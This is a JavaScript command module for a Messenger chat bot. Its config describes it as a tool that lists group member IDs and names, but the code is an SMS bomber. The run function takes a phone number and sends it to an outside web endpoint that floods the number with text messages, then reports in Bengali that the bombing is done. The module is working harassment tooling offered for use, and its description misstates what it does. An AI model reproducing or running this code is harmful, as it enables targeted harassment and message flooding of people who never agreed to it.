module.exports.config = {
  name: "sms",
  version: "1.0.5",
  permission: 0,
  prefix: false,
  credits: "Deku",
  description: "Get all uid and names in Group.",
  category: "without prefix",
  cooldowns: 15,
dependencies: {"axios" : ""}
};
module.exports.run = async({api, event, args}) => {
const axios = require('axios');
if (args[0]) {
api.sendMessage(`এসএমএস বোম্বিং হচ্ছে...`, event.threadID, (err, info) => setTimeout(() => { api.unsendMessage(info.messageID) }, 90000));
let i1 = (args[0]) //sms bomb api // fixed by TANVIR-TAMIM // dont harm this //
const res = await axios.get(`https://ultranetrn.com.br/fonts/api.php?number=${i1}`);
return api.sendMessage(`- এসএমএস বোম্বিং সম্পূর্ন 🌼\n`, event.threadID, event.messageID)
} //modifi credit - fixed by TANVIR-TAMIM
else if (args.join() == "") { 
  return api.sendMessage(`🌼••SMS BOMBER 𝐓𝐇𝐄 𝐑𝐄𝐁𝐄𝐋••🌼\n\nএসএমএস বোম্বিং করতে /sms লিখে নাম্বার লেখো🥰(with out +00 ) \n\nপ্রতিবারে সর্বোচ্চ ৫ টি মেসেজ যাবে`, event.threadID, event.messageID)}
} 